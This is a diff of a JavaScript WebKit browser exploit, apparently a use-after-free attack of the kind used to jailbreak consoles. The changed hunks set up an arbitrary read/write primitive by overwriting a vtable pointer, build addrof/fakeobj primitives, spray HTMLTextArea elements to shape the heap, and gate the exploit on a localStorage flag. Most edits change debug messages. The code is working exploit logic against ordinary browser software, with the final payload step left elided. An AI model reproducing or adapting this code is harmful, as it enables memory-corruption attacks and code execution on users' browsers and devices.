@@ -100,7 +100,7 @@ function setupRW() {
 	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
 
-	debug_log("[+] Webkit Exploit Finished Successfully");
+	debug_log("[+] Succesfully got arbitrary R/W!");
 
 	/* Restore the overidden vtable pointer */
 	write64(guess_htmltextarea_addr, saved_vtable);
@@ -116,12 +116,12 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("[+] Launching Payload, Wait 20 Seconds...");
-
+	debug_log("[+] Succesfully got addrof/fakeobj");
+	
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
-		window.postExploit();
+		window.postExploit();	    
 }
 
 function read(addr, length) {
@@ -413,7 +413,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("[+] Running Webkit Exploit ...");
+	debug_log("[+] Spraying HTMLTextareaElement ...");
 
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
@@ -442,13 +442,15 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-	/* Init spray */
-	sprayHTMLTextArea();
+	if(localStorage.isNK755Acached){
+		/* Init spray */
+		sprayHTMLTextArea();
 
-	if(window.midExploit)
-		window.midExploit();
+		if(window.midExploit)
+			window.midExploit();
 
-	g_input = input1;
-	/* Shape heap layout for obj. reuse */
-	prepareUAF();
+		g_input = input1;
+		/* Shape heap layout for obj. reuse */
+		prepareUAF();
+	}
 }
